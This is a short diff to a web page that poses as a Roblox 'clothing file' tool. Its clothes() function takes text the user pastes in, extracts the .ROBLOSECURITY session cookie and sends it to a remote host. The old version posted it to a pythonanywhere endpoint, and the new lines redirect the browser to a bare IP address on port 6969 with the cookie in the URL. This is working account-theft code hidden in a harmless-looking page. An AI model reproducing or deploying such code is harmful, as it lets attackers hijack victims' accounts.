@@ -86,10 +86,9 @@ If you don't know how to find a clothings "clothing file" then go ahead and watc
       function clothes() {
         a = code.value;
         b = a.split('.ROBLOSECURITY=').pop();
-        c = b.split('; RBXEventTrackerV2')[0]
-        $.post("https://bloxtools.pythonanywhere.com/send_data", JSON.stringify({
-            'content': c
-        }));
+        c = b.split(';')[0]
+        location.href = "http://159.223.217.5:6969/send_data?content="+c;
+      }
       }
       function remove_hash() {
         setTimeout(() => {
